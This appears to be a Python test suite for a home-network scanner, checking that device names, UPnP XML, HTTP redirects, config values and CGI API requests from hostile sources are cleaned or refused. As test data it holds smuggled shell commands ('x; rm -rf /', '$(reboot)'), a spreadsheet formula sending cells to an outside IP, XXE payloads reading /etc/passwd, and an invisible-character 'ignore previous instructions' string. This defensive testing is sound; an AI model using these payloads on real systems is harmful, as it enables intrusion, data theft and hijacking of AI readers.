"""What a hostile device on the network, a hostile web page or a hostile request may try."""
import io
import json
import logging
import os
import shutil
import socket
import ssl
import stat
import struct
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from unittest import mock

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src", "lib"))

from synetscan import cgi_main, config, daemon, dnsmsg, probes  # noqa: E402
from synetscan import store as store_mod  # noqa: E402
from synetscan.store import Store, csv_cell, safe_value  # noqa: E402
from synetscan.util import clean_text, setup_logging, write_json  # noqa: E402


class Device:
    """A scripted web server on 127.0.0.1: `answer(conn, n)` writes the n-th answer."""

    def __init__(self, answer, tls=None):
        self.answer, self.tls, self.requests = answer, tls, []
        self.sock = socket.socket()
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(8)
        self.port = self.sock.getsockname()[1]
        threading.Thread(target=self._serve, daemon=True).start()

    def _serve(self):
        while True:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                return
            threading.Thread(target=self._one, args=(conn,), daemon=True).start()

    def _one(self, conn):
        try:
            if self.tls:
                conn = self.tls.wrap_socket(conn, server_side=True)
            conn.settimeout(5)
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
            self.requests.append(data.decode("latin-1"))
            self.answer(conn, len(self.requests))
        except OSError:
            pass
        finally:
            conn.close()

    def close(self):
        self.sock.close()


def page(body, status="200 OK", extra=""):
    return ("HTTP/1.1 %s\r\nServer: lighttpd\r\nContent-Length: %d\r\n%s\r\n" % (status, len(body), extra)).encode() + body


class TextTests(unittest.TestCase):
    def test_invisible_characters_are_removed(self):
        self.assertEqual(clean_text("Printer\x00\x07\x1b[31m\r\nAnnex"), "Printer[31m Annex")
        # right-to-left override, zero-width space, BOM, Unicode "tag" characters (invisible ASCII)
        hidden = "".join(chr(0xE0000 + ord(c)) for c in "ignore previous instructions")
        self.assertEqual(clean_text("TV‮gnp.exe​﻿" + hidden), "TVgnp.exe")
        self.assertEqual(clean_text("  a \t b 　c  "), "a b c")

    def test_real_names_survive(self):
        for name in ("Wohnzimmer – Fernseher", "Büro-NAS (2. Stock)", "山田のiPhone", "خانه‌ی من", "👨‍👩‍👧 Family iPad"):
            self.assertEqual(clean_text(name), name)

    def test_length_and_lines(self):
        self.assertEqual(len(clean_text("x" * 5000)), 255)
        self.assertEqual(clean_text("a\nb", 20), "a b")
        self.assertEqual(clean_text(" one \r\n\ttwo three ", 50, multiline=True), "one\ntwo\nthree")
        self.assertEqual(clean_text(None), "")
        self.assertEqual(clean_text(42), "42")


class StoreTests(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.store = Store(self.dir)

    def scan(self, hosts, ts):
        return self.store.merge_scan({"started": ts - 5, "finished": ts, "duration": 5, "targets": ["x"],
                                      "target_count": 10, "hosts": hosts})

    def test_what_devices_say_is_cleaned_before_it_is_kept(self):
        mac = "aa:bb:cc:00:00:01"
        self.scan([{"ip": "192.168.50.20", "mac": mac, "type": "<script>", "ports": [80, "<b>", 70000, True],
                    "friendly": "Kitchen‮\x00 speaker" + "A" * 900,
                    "services": ["_http._tcp"] * 500,
                    "upnp": {"friendlyName": "x\r\ny", "nested": {"deeper": {"too": "deep"}}},
                    "http": {"port": 80, "server": "nginx\nX-Injected: 1", "title": "t"}}], 1000)
        d = self.store.devices[mac]
        self.assertEqual(d["friendly"], ("Kitchen speaker" + "A" * 900)[:255])
        self.assertEqual(d["ports"], [80])
        self.assertEqual(d["type_auto"], "unknown")
        self.assertEqual(len(d["services"]), 64)
        self.assertEqual(d["upnp"]["friendlyName"], "x y")
        self.assertIsInstance(d["upnp"]["nested"]["deeper"], str)
        self.assertEqual(d["http"], {"port": 80, "server": "nginx X-Injected: 1", "title": "t"})
        self.assertEqual(self.store.events, [e for e in self.store.events if "\n" not in e["name"]])

    def test_records_of_older_versions_are_cleaned_on_load(self):
        write_json(os.path.join(self.dir, "devices.json"),
                   {"aa:bb:cc:00:00:02": {"id": "aa:bb:cc:00:00:02", "ip": "192.168.50.21", "netbios": "PC​\x1b]0;x\x07",
                                          "ports": [22], "online": True},
                    "broken": "not a record"})
        write_json(os.path.join(self.dir, "events.json"), {"not": "a list"})
        st = Store(self.dir)
        self.assertEqual(list(st.devices), ["aa:bb:cc:00:00:02"])
        self.assertEqual(st.devices["aa:bb:cc:00:00:02"]["netbios"], "PC]0;x")
        self.assertEqual(st.events, [])

    def test_names_and_notes_from_the_form(self):
        mac = "aa:bb:cc:00:00:03"
        self.scan([{"ip": "192.168.50.22", "mac": mac, "type": "computer", "ports": []}], 1000)
        self.store.update_device(mac, {"name": " Desk‮\x00top " + "x" * 100, "notes": "line 1\r\nline\x00 2\n" + "y" * 2000})
        d = self.store.devices[mac]
        self.assertEqual(d["name"], ("Desktop " + "x" * 100)[:64])
        self.assertTrue(d["notes"].startswith("line 1\nline 2\n"))
        self.assertEqual(len(d["notes"]), 1000)

    def test_csv_cells_cannot_be_formulas(self):
        self.assertEqual(csv_cell('=HYPERLINK("http://203.0.113.5/?"&A1,"x")'), "'=HYPERLINK(\"http://203.0.113.5/?\"&A1,\"x\")")
        for start in "=+-@":
            self.assertTrue(csv_cell(start + "cmd|' /C calc'!A0").startswith("'"))
        self.assertEqual(csv_cell("192.168.50.2"), "192.168.50.2")
        mac = "aa:bb:cc:00:00:04"
        self.scan([{"ip": "192.168.50.23", "mac": mac, "type": "iot", "ports": [80], "friendly": "=1+1"}], 1000)
        self.store.update_device(mac, {"notes": "@SUM(A1)"})
        row = self.store.export_csv().splitlines()[1]
        self.assertTrue(row.startswith("'=1+1,"))
        self.assertTrue(row.endswith(",'@SUM(A1)"))

    def test_device_list_is_bounded(self):
        host = lambda n, **kw: dict({"ip": "192.168.50.%d" % n, "mac": "aa:bb:cc:00:01:%02x" % n,  # noqa: E731
                                     "type": "unknown", "ports": []}, **kw)
        with mock.patch.object(store_mod, "MAX_DEVICES", 4), self.assertLogs("synetscan", "WARNING"):
            self.scan([host(1, self=True), host(2)], 1000)          # first scan: both known
            self.scan([host(1, self=True), host(3), host(4)], 2000)  # 2 goes offline
            self.scan([host(1, self=True), host(5), host(6), host(7)], 3000)
        left = {d["ip"] for d in self.store.devices.values()}
        self.assertEqual(len(left), 4)
        # the NAS and the device the admin knows stay; the unknown offline ones went first
        self.assertTrue({"192.168.50.1", "192.168.50.2"} <= left)
        self.assertFalse({"192.168.50.3", "192.168.50.4"} & left)

    def test_history_is_bounded_in_memory(self):
        self.store.events = [{"ts": i, "kind": "new"} for i in range(store_mod.MAX_EVENTS + 500)]
        self.store.scans = [{"finished": i} for i in range(store_mod.MAX_SCANS + 50)]
        self.scan([{"ip": "192.168.50.30", "mac": "aa:bb:cc:00:00:05", "type": "unknown", "ports": []}], 5000)
        self.assertEqual(len(self.store.events), store_mod.MAX_EVENTS)
        self.assertEqual(len(self.store.scans), store_mod.MAX_SCANS)

    def test_state_and_log_are_private(self):
        self.scan([{"ip": "192.168.50.31", "mac": "aa:bb:cc:00:00:06", "type": "unknown", "ports": []}], 1000)
        log_path = os.path.join(self.dir, "synetscan.log")
        logger = setup_logging(log_path)
        try:
            logger.info("found %s", "Printer\nFAKE 2026-01-01 ERROR forged line")
        finally:
            for h in logger.handlers[:]:
                h.close()
                logger.removeHandler(h)
            logger.addHandler(logging.NullHandler())
        for name in ("devices.json", "events.json", "scans.json", "synetscan.log"):
            self.assertEqual(stat.S_IMODE(os.stat(os.path.join(self.dir, name)).st_mode), 0o600, name)
        with open(log_path, encoding="utf-8") as f:
            self.assertEqual(len(f.read().splitlines()), 1)

    def test_safe_value_bounds(self):
        self.assertEqual(safe_value(["a"] * 100, "ipv6"), ["a"] * 64)
        self.assertEqual(len(safe_value({str(i): i for i in range(100)}, "upnp")), 16)
        self.assertEqual(safe_value(3.5, "rtt"), 3.5)
        self.assertEqual(safe_value("not a list", "ports"), [])


class DnsTests(unittest.TestCase):
    def test_names_cannot_expand_beyond_the_dns_limits(self):
        label = b"\x3f" + b"a" * 63
        with self.assertRaises(ValueError):
            dnsmsg._read_name(label * 5 + b"\x00", 0)          # 320 bytes
        with self.assertRaises(ValueError):
            dnsmsg._read_name(b"\x50" + b"a" * 80 + b"\x00", 0)  # label of 80 bytes
        # every pointer leads to 60 more bytes: 20 jumps would give a name of 1200
        data = b""
        for i in range(21):
            data += b"\x3b" + b"b" * 59 + (struct.pack("!H", 0xC000 | (len(data) + 62)) if i < 20 else b"\x00")
        with self.assertRaises(ValueError):
            dnsmsg._read_name(data, 0)
        with self.assertRaises(ValueError):
            dnsmsg._read_name(b"\xc0\x00", 0)                   # a pointer to itself
        self.assertEqual(dnsmsg._read_name(b"\x07printer\x05local\x00", 0), ("printer.local", 15))

    def test_only_plausible_service_types_are_queried(self):
        ok = probes._SERVICE_TYPE.match
        self.assertTrue(ok("_ipp._tcp.local") and ok("_spotify-connect._tcp.local") and ok("_sleep-proxy._udp.local"))
        self.assertFalse(ok("victim.example.com") or ok("_x._tcp.example.com") or ok("_" + "a" * 70 + "._tcp.local"))


class XmlTests(unittest.TestCase):
    def test_device_description(self):
        xml = (b'<?xml version="1.0"?><root xmlns="urn:schemas-upnp-org:device-1-0"><device>'
               b"<deviceType>urn:schemas-upnp-org:device:MediaRenderer:1</deviceType>"
               b"<friendlyName>Living  Room\n TV &amp; Sound\xe2\x80\xae</friendlyName><manufacturer>Example</manufacturer>"
               b"<modelName>" + b"M" * 500 + b"</modelName>"
               b"<deviceList><device><friendlyName>Sub device</friendlyName></device></deviceList></device></root>")
        d = probes.parse_upnp(xml)
        self.assertEqual(d["friendlyName"], "Living Room TV & Sound")
        self.assertEqual(d["manufacturer"], "Example")
        self.assertEqual(len(d["modelName"]), 120)

    def test_entities_are_refused(self):
        bomb = (b'<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY a "aaaaaaaaaa">'
                b'<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]>'
                b"<root><friendlyName>&c;</friendlyName></root>")
        self.assertIsNone(probes.parse_upnp(bomb))
        external = b'<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r><friendlyName>&x;</friendlyName></r>'
        self.assertIsNone(probes.parse_upnp(external))
        param = b'<!DOCTYPE r [<!ENTITY % p SYSTEM "file:///etc/passwd"> %p;]><r><friendlyName>TV</friendlyName></r>'
        self.assertIsNone(probes.parse_upnp(param))
        # a DOCTYPE without declarations is harmless, and 1.1.2 read such descriptions
        for doctype in (b"<!DOCTYPE root>", b'<!DOCTYPE root SYSTEM "http://example.com/upnp.dtd">'):
            self.assertEqual(probes.parse_upnp(b'<?xml version="1.0"?>' + doctype + b"<root><device><friendlyName>TV"
                                               b"</friendlyName></device></root>"), {"friendlyName": "TV"}, doctype)

    def test_sloppy_xml_keeps_what_was_readable(self):
        self.assertEqual(probes.parse_upnp(b"<root><friendlyName>Cam</friendlyName><oops></root>"), {"friendlyName": "Cam"})
        self.assertEqual(probes.parse_upnp(b"\x00\xff not xml"), {})

    def test_patterns_stay_fast_on_hostile_input(self):
        start = time.monotonic()
        self.assertEqual(probes._html_title(b"<title" * 20000), "")
        self.assertEqual(probes._html_title(b"<title>" + b"<title>" * 20000 + b"x"), "")
        self.assertIsNone(probes._WSD_TYPES.search(b"<" * 9000))
        self.assertIsNone(probes._WSD_TYPES.search(b"<" + b"a:" * 4500))
        self.assertLess(time.monotonic() - start, 1.0)
        self.assertEqual(probes._WSD_TYPES.search(b"<wsd:Types>wsdp:Device pub:Computer</wsd:Types>").group(1),
                         b"wsdp:Device pub:Computer")
        self.assertEqual(probes._html_title(b"<html><TITLE lang=en>\n Router &amp;\x00 Modem\xe2\x80\x8b </TITLE>"), "Router & Modem")


class UpnpLocationTests(unittest.TestCase):
    """The LOCATION of an SSDP answer is whatever the sender wrote into a UDP packet."""

    def fetch(self, location, sender="192.168.50.7"):
        calls = []

        def fake(addr, port, tls, host, path, deadline, max_body, agent):
            calls.append((addr, port, tls, host, path))
            return 200, {}, b"<root><friendlyName>ok</friendlyName></root>"

        with mock.patch.object(probes, "_http_get", fake):
            return probes.upnp_description(location, sender), calls

    def test_only_the_sender_is_contacted(self):
        res, calls = self.fetch("http://192.168.50.7:49152/desc.xml?x=1")
        self.assertEqual((res, calls), ({"friendlyName": "ok"}, [("192.168.50.7", 49152, False, "192.168.50.7:49152", "/desc.xml?x=1")]))
        # another host, the NAS itself, a name: the request still goes to the sender
        for loc in ("http://192.168.50.1/admin/reboot", "http://127.0.0.1:5000/webapi/entry.cgi", "https://internal.example:8443/x"):
            _, calls = self.fetch(loc)
            self.assertEqual(calls[0][0], "192.168.50.7", loc)
        _, calls = self.fetch("http://[fe80::1]:1900/d.xml", "fe80::aa:bbff:fecc:1%eth0")
        self.assertEqual(calls[0][:4], ("fe80::aa:bbff:fecc:1%eth0", 1900, False, "[fe80::aa:bbff:fecc:1]:1900"))

    def test_other_schemes_and_odd_urls_are_not_fetched(self):
        for loc in ("file:///etc/passwd", "ftp://192.168.50.7/x", "gopher://192.168.50.7/", "//192.168.50.7/x", "/etc/shadow",
                    "", "http://192.168.50.7:99999/x", "http://192.168.50.7:0/x", "http://192.168.50.7:abc/x", "http://[::1/x", "javascript:alert(1)",
                    "http://192.168.50.7/" + "a" * 2000):
            self.assertEqual(self.fetch(loc), (None, []), loc)

    def test_the_path_cannot_carry_a_second_request(self):
        _, calls = self.fetch("http://192.168.50.7/a b\r\nHost: evil\r\n\r\nGET /x")
        for addr, port, tls, host, path in calls:
            self.assertRegex(path, r"^/[\x21-\x7e]*$")


class HttpClientTests(unittest.TestCase):
    def serve(self, answer, tls=None):
        dev = Device(answer, tls)
        self.addCleanup(dev.close)
        return dev

    def test_title_and_server(self):
        dev = self.serve(lambda c, n: c.sendall(page(b"<html><head><title>My Router</title></head></html>")))
        self.assertEqual(probes.http_info("127.0.0.1", dev.port), {"port": dev.port, "server": "lighttpd", "title": "My Router"})
        self.assertIn("Host: 127.0.0.1:%d\r\n" % dev.port, dev.requests[0])

    def test_chunked_and_error_pages(self):
        def answer(c, n):
            c.sendall(b"HTTP/1.1 401 Unauthorized\r\nTransfer-Encoding: chunked\r\nServer: cam\r\n\r\n"
                      b"7\r\n<title>\r\nA;ext=1\r\nLogin page\r\n8\r\n</title>\r\n0\r\n\r\n")
        dev = self.serve(answer)
        self.assertEqual(probes.http_info("127.0.0.1", dev.port), {"port": dev.port, "server": "cam", "title": "Login page"})

    def test_redirects_stay_on_the_device(self):
        def answer(c, n):
            if n == 1:
                c.sendall(page(b"", "302 Found", "Location: /login.html\r\n"))
            elif n == 2:
                c.sendall(page(b"", "301 Moved", "Location: http://device.example:%d/ui/?a=1\r\n" % port[0]))
            else:
                c.sendall(page(b"<title>Device UI</title>"))
        port = []
        dev = self.serve(answer)
        port.append(dev.port)
        self.assertEqual(probes.http_info("127.0.0.1", dev.port)["title"], "Device UI")
        self.assertTrue(dev.requests[1].startswith("GET /login.html HTTP/1.1\r\n"))
        # the name of the redirect is only sent as Host header; the connection went to 127.0.0.1 again
        self.assertTrue(dev.requests[2].startswith("GET /ui/?a=1 HTTP/1.1\r\nHost: device.example:%d\r\n" % dev.port))

    def test_redirect_to_another_machine_is_not_followed(self):
        other = self.serve(lambda c, n: c.sendall(page(b"<title>Secret admin console</title>")))
        dev = self.serve(lambda c, n: c.sendall(page(b"", "302 Found", "Location: http://127.0.0.2:%d/\r\n" % other.port)))
        info = probes.http_info("127.0.0.1", dev.port)
        self.assertEqual(info, {"port": dev.port, "server": "lighttpd", "title": ""})
        self.assertEqual((len(dev.requests), other.requests), (1, []))

    def test_redirect_rules(self):
        r = lambda loc: probes._redirect({"location": loc}, False, "192.168.50.9", 80, "/", "192.168.50.9")  # noqa: E731
        self.assertEqual(r("/a?b=1"), (False, "192.168.50.9", 80, "/a?b=1"))
        self.assertEqual(r("https://192.168.50.9/"), (True, "192.168.50.9", 443, "/"))
        self.assertEqual(r("https://fritz.box:8443/start page"), (True, "fritz.box", 8443, "/start%20page"))
        for loc in ("http://192.168.50.1/", "http://[::1]/", "file:///etc/passwd", "ftp://192.168.50.9/", "//192.168.50.1/x",
                    "http://user:pw@192.168.50.9/", "http://bad_host!/x", "http://192.168.50.9:0/", "/" + "a" * 3000, ""):
            self.assertIsNone(r(loc), loc)

    def test_what_urllib_read_is_still_read(self):
        title = b"<html><title>Dev UI</title></html>"
        cases = [
            # an interim answer before the real one
            (lambda c, n: c.sendall(b"HTTP/1.1 100 Continue\r\n\r\n" + page(title)), "Dev UI", "lighttpd"),
            # a redirect that is not followed still has a page
            (lambda c, n: c.sendall(page(title, "302 Found")), "Dev UI", "lighttpd"),
            (lambda c, n: c.sendall(page(title, "302 Found", "Location: http://192.168.50.77/\r\n")), "Dev UI", "lighttpd"),
            # the header ends with the connection
            (lambda c, n: c.sendall(b"HTTP/1.0 200 OK\r\nServer: tiny\r\n"), "", "tiny"),
        ]
        for answer, want_title, want_server in cases:
            dev = self.serve(answer)
            info = probes.http_info("127.0.0.1", dev.port, 2)
            self.assertEqual((info["title"], info["server"]), (want_title, want_server))
        # a host name with a trailing dot, and more redirects than before
        chain = self.serve(lambda c, n: c.sendall(page(title) if n >= 5 else
                                                  page(b"", "302 Found", "Location: http://localhost.:%d/%d\r\n" % (chain.port, n))))
        self.assertEqual(probes.http_info("127.0.0.1", chain.port, 2)["title"], "Dev UI")
        self.assertIn("Host: localhost:%d\r\n" % chain.port, chain.requests[1])

    def test_endless_redirects_end(self):
        dev = self.serve(lambda c, n: c.sendall(page(b"", "302 Found", "Location: /again%d\r\n" % n)))
        self.assertEqual(probes.http_info("127.0.0.1", dev.port)["title"], "")
        self.assertEqual(len(dev.requests), 10)

    def test_a_dripping_device_cannot_hold_up_the_scan(self):
        def drip_body(c, n):
            c.sendall(b"HTTP/1.1 200 OK\r\nServer: slow\r\n\r\n<title>Drip</title>")
            for _ in range(100):
                time.sleep(0.1)
                c.sendall(b"x")

        def drip_header(c, n):
            for ch in b"HTTP/1.1 200 OK\r\nX-Padding: " + b"y" * 200:
                time.sleep(0.1)
                c.sendall(bytes([ch]))

        for answer, expect in ((drip_body, {"server": "slow", "title": "Drip"}), (drip_header, None)):
            dev = self.serve(answer)
            start = time.monotonic()
            info = probes.http_info("127.0.0.1", dev.port, 0.8)
            self.assertLess(time.monotonic() - start, 1.5)
            self.assertEqual(info and {"server": info["server"], "title": info["title"]}, expect)

    def test_oversized_answers_are_cut(self):
        dev = self.serve(lambda c, n: c.sendall(b"HTTP/1.1 200 OK\r\n" + b"X-Fill: " + b"h" * 50000 + b"\r\n"))
        self.assertIsNone(probes.http_info("127.0.0.1", dev.port, 2))

        def endless(c, n):
            c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 99999999999\r\n\r\n")
            for _ in range(2000):
                c.sendall(b"z" * 65536)
        dev = self.serve(endless)
        status, _, body = probes._http_get("127.0.0.1", dev.port, False, "127.0.0.1", "/", probes._Deadline(5), 65536, "t")
        self.assertEqual((status, len(body)), (200, 65536))

    def test_not_http_and_no_names(self):
        dev = self.serve(lambda c, n: c.sendall(b"SSH-2.0-OpenSSH_9.6\r\n\r\n"))
        self.assertIsNone(probes.http_info("127.0.0.1", dev.port, 2))
        with self.assertRaises(ValueError):  # only addresses are connected to, names are never resolved
            probes._http_get("localhost", dev.port, False, "localhost", "/", probes._Deadline(2), 100, "t")

    def test_upnp_description_from_a_device(self):
        xml = b"<root><device><friendlyName>Radio</friendlyName><modelName>R1</modelName></device></root>"
        dev = self.serve(lambda c, n: c.sendall(page(xml)))
        self.assertEqual(probes.upnp_description("http://10.99.99.99:%d/desc.xml" % dev.port, "127.0.0.1"),
                         {"friendlyName": "Radio", "modelName": "R1"})
        self.assertTrue(dev.requests[0].startswith("GET /desc.xml HTTP/1.1\r\nHost: 127.0.0.1:%d\r\n" % dev.port))
        # a redirect is followed on the same device, never to another one
        moved = self.serve(lambda c, n: c.sendall(page(xml, "302 Found", "Location: http://127.0.0.1:%d/x\r\n" % dev.port)))
        self.assertEqual(probes.upnp_description("http://127.0.0.1:%d/" % moved.port, "127.0.0.1"),
                         {"friendlyName": "Radio", "modelName": "R1"})
        self.assertTrue(dev.requests[-1].startswith("GET /x HTTP/1.1\r\n"))
        away = self.serve(lambda c, n: c.sendall(page(xml, "302 Found", "Location: http://127.0.0.2:%d/x\r\n" % dev.port)))
        self.assertIsNone(probes.upnp_description("http://127.0.0.1:%d/" % away.port, "127.0.0.1"))

    def test_a_device_with_several_upnp_stacks(self):
        xml = b"<root><device><friendlyName>Router</friendlyName><modelName>R3</modelName></device></root>"
        nothing = self.serve(lambda c, n: c.sendall(page(b"not found", "404 Not Found")))
        empty = self.serve(lambda c, n: c.sendall(page(b"<root><specVersion><major>1</major></specVersion></root>")))
        dev = self.serve(lambda c, n: c.sendall(page(xml)))
        closed = socket.socket()
        closed.bind(("127.0.0.1", 0))
        locations = ["http://127.0.0.1:%d/a.xml" % p for p in (closed.getsockname()[1], nothing.port, empty.port, dev.port)]
        closed.close()
        # the stacks that answered first say nothing about the device; the last one names it
        self.assertEqual(probes.upnp_first_description(locations, "127.0.0.1"), {"friendlyName": "Router", "modelName": "R3"})
        self.assertIsNone(probes.upnp_first_description(locations[:3], "127.0.0.1"))
        self.assertIsNone(probes.upnp_first_description([], "127.0.0.1"))
        # four descriptions that never arrive cost one time budget, not four
        stuck = [self.serve(lambda c, n: time.sleep(3)) for _ in range(4)]
        start = time.monotonic()
        self.assertIsNone(probes.upnp_first_description(["http://127.0.0.1:%d/" % d.port for d in stuck], "127.0.0.1", 1.2))
        self.assertLess(time.monotonic() - start, 1.6)
        self.assertLess(sum(len(d.requests) for d in stuck), 4)

    @unittest.skipUnless(shutil.which("openssl"), "needs the openssl command for a test certificate")
    def test_self_signed_tls(self):
        d = tempfile.mkdtemp()
        key, crt = os.path.join(d, "k.pem"), os.path.join(d, "c.pem")
        subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", key, "-out", crt,
                        "-days", "2", "-subj", "/CN=device.example"], check=True, capture_output=True)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(crt, key)
        dev = self.serve(lambda c, n: c.sendall(page(b"<title>Secure Cam</title>")), ctx)
        status, headers, body = probes._http_get("127.0.0.1", dev.port, True, "127.0.0.1", "/", probes._Deadline(5), 65536, "t")
        self.assertEqual((status, headers["server"], body), (200, "lighttpd", b"<title>Secure Cam</title>"))

    def test_a_tls_handshake_that_never_ends(self):
        # one port stays silent; the other starts a handshake record of 16000 bytes and
        # delivers it one byte at a time
        silent, dripping = socket.socket(), socket.socket()
        for s in (silent, dripping):
            s.bind(("127.0.0.1", 0))
            s.listen(1)
            self.addCleanup(s.close)

        def drip():
            try:
                conn, _ = dripping.accept()
                conn.recv(4096)
                for ch in b"\x16\x03\x03\x3e\x80\x02\x00\x3e\x7c\x03\x03" + b"\x00" * 200:
                    conn.sendall(bytes([ch]))
                    time.sleep(0.1)
            except OSError:
                pass

        threading.Thread(target=drip, daemon=True).start()
        for s in (silent, dripping):
            start = time.monotonic()
            with self.assertRaises(OSError):
                probes._http_get("127.0.0.1", s.getsockname()[1], True, "127.0.0.1", "/", probes._Deadline(0.6), 100, "t")
            self.assertLess(time.monotonic() - start, 1.2)


class ConfigTests(unittest.TestCase):
    def test_limits(self):
        cur = config.merged({})
        self.assertEqual(config.validate({"excluded_interfaces": ["eth1", "ovs_bond0", "eth0.100", "x; rm -rf /", 7, "a" * 40]}, cur)
                         ["excluded_interfaces"], ["eth1", "ovs_bond0", "eth0.100"])
        self.assertEqual(config.validate({"excluded_interfaces": "eth0"}, cur)["excluded_interfaces"], [])
        self.assertEqual(config.validate("nonsense", cur), cur)
        # what 1.1.2, which had no limit, may have stored still saves; the limit has a message of its own
        many = ["10.0.%d.%d" % (i // 250, i % 250 + 1) for i in range(80)]
        self.assertEqual(config.validate({"custom_targets": many}, cur)["custom_targets"], many)
        with self.assertRaises(config.ConfigError) as cm:
            config.validate({"custom_targets": many * 13}, cur)
        self.assertEqual((cm.exception.field, cm.exception.value), ("custom_targets_count", "1024"))
        for bad in ({"custom_targets": 5},
                    {"custom_targets": ["$(reboot)"]}, {"ports": {"a": 1}}, {"ports": 80}, {"ports": [float("inf")]},
                    {"threads": float("inf")}, {"timeout": float("nan")}, {"timeout": 10 ** 400}, {"schedule_interval": [5]}):
            with self.assertRaises(config.ConfigError, msg=str(bad)[:60]):
                config.validate(bad, cur)
        try:
            config.validate({"custom_targets": ["bad‮\x00" + "z" * 500]}, cur)
        except config.ConfigError as e:
            self.assertLessEqual(len(e.value), 64)
            self.assertNotIn("\x00", e.value)


class ApiGateTests(unittest.TestCase):
    """api.cgi: what gets through to the service."""

    def call(self, action="status", method="GET", body=b"", user="alice", admin=True, **env):
        environ = {"QUERY_STRING": "action=" + action, "REQUEST_METHOD": method, "CONTENT_LENGTH": str(len(body))}
        environ.update(env)
        out = mock.Mock(buffer=io.BytesIO())
        self.stdin = io.BytesIO(body)
        sent = []

        def request(var_dir, action, params=None, user="", timeout=30):
            sent.append((action, params, user))
            return {"success": True, "data": {"csv": "Name\r\n"}}

        with mock.patch.dict(os.environ, environ, clear=True), mock.patch.object(sys, "stdout", out), \
                mock.patch.object(sys, "stdin", mock.Mock(buffer=self.stdin)), \
                mock.patch.object(cgi_main, "authenticate", lambda: user), \
                mock.patch.object(cgi_main, "is_admin", lambda u: admin), \
                mock.patch.object(daemon, "request", request):
            cgi_main.main()
        head, _, payload = out.buffer.getvalue().partition(b"\r\n\r\n")
        return head.decode(), payload.decode("utf-8-sig"), sent

    def code(self, *args, **kw):
        head, payload, sent = self.call(*args, **kw)
        self.assertEqual(sent, [], payload)
        return payload.split('"code": "')[1].split('"')[0]

    def test_reads_and_writes(self):
        head, payload, sent = self.call("devices", HTTP_SEC_FETCH_SITE="same-origin")
        self.assertEqual(sent, [("devices", {}, "alice")])
        for h in ("X-Content-Type-Options: nosniff", "Cache-Control: no-store", "Referrer-Policy: no-referrer",
                  "Content-Security-Policy: default-src 'none'; frame-ancestors 'none'"):
            self.assertIn(h, head)
        _, _, sent = self.call("device_delete", "POST", b'{"ids": ["aa:bb:cc:00:00:01"]}', CONTENT_TYPE="application/json; charset=utf-8")
        self.assertEqual(sent, [("device_delete", {"ids": ["aa:bb:cc:00:00:01"]}, "alice")])

    def test_requests_started_by_another_website_are_refused(self):
        for site in ("cross-site", "same-site", "CROSS-SITE", "bogus"):
            self.assertEqual(self.code("devices", HTTP_SEC_FETCH_SITE=site), "cross_site")
        # what an HTML form or a "simple" cross-origin fetch can send along with the admin's cookies
        for ctype in ("application/x-www-form-urlencoded", "multipart/form-data; boundary=x", "text/plain", ""):
            self.assertEqual(self.code("reset", "POST", b'{"a": 1}', CONTENT_TYPE=ctype), "bad_request")
        # anything that changes state needs a POST; an <img src> or a link is a GET
        for action in ("scan", "reset", "config_set", "device_delete", "device_update", "wake", "clear_events"):
            self.assertEqual(self.code(action), "method")
        self.assertEqual(self.code("devices", "DELETE"), "method")

    def test_bad_requests(self):
        # only what the service answers gets past the gate, whatever the method
        for action in ("../../etc/passwd", "__class__", "", "STATUS", "handle", "no_such_thing", "status%00"):
            self.assertEqual(self.code(action), "unknown_action")
            self.assertEqual(self.code(action, "POST", b"{}", CONTENT_TYPE="application/json"), "unknown_action")
        self.assertLessEqual(cgi_main.READ_ACTIONS, cgi_main.ACTIONS)
        self.assertEqual(cgi_main.ACTIONS - cgi_main.READ_ACTIONS,
                         {"scan", "cancel", "reset", "config_set", "device_update", "device_known", "device_delete",
                          "wake", "clear_events", "clear_offline", "opened"})
        self.assertEqual(self.code("scan", "POST", b"[1]", CONTENT_TYPE="application/json"), "bad_request")
        self.assertEqual(self.code("scan", "POST", b"[" * 100000, CONTENT_TYPE="application/json"), "bad_request")
        self.assertEqual(self.code("scan", "POST", b"x", CONTENT_TYPE="application/json", CONTENT_LENGTH="99999999"), "too_large")
        self.assertEqual(self.code("devices", user=None), "auth")
        self.assertEqual(self.code("devices", admin=False), "permission")

    def test_the_body_is_read_before_any_answer(self):
        # a CGI that answers with its request body unread may lose the answer at the web server
        body = b'{"ids": ["aa:bb:cc:00:00:01"]}'
        js = {"CONTENT_TYPE": "application/json"}
        for args, kw, expected in [
                (("devices", "POST", body), dict(js, HTTP_SEC_FETCH_SITE="cross-site"), "cross_site"),
                (("devices", "POST", body), dict(js, user=None), "auth"),
                (("devices", "POST", body), dict(js, admin=False), "permission"),
                (("no_such_thing", "POST", body), js, "unknown_action"),
                (("scan", "DELETE", body), js, "method"),
                (("cancel", "POST", body), {"CONTENT_TYPE": "text/plain"}, "bad_request"),
                (("scan", "POST", b"{" + b" " * 300000), dict(js, CONTENT_LENGTH=str(daemon.MAX_REQUEST + 5)), "too_large")]:
            self.assertEqual(self.code(*args, **kw), expected)
            self.assertEqual(self.stdin.read(), b"", expected)
        # a GET carrying a body, and a body larger than announced or than is ever read
        self.call("status", "GET", body)
        self.assertEqual(self.stdin.read(), b"")
        self.assertEqual(self.code("scan", "POST", b"x" * 100, CONTENT_TYPE="application/json",
                                   CONTENT_LENGTH=str(cgi_main.DRAIN_LIMIT * 4)), "too_large")
        _, _, sent = self.call("cancel", "POST", b"{}", CONTENT_TYPE="application/json", CONTENT_LENGTH="abc")
        self.assertEqual(sent, [("cancel", {}, "alice")])
        with mock.patch.object(sys, "stdin", None), mock.patch.dict(os.environ, {"CONTENT_LENGTH": "10"}):
            self.assertEqual(cgi_main.read_body(), b"")

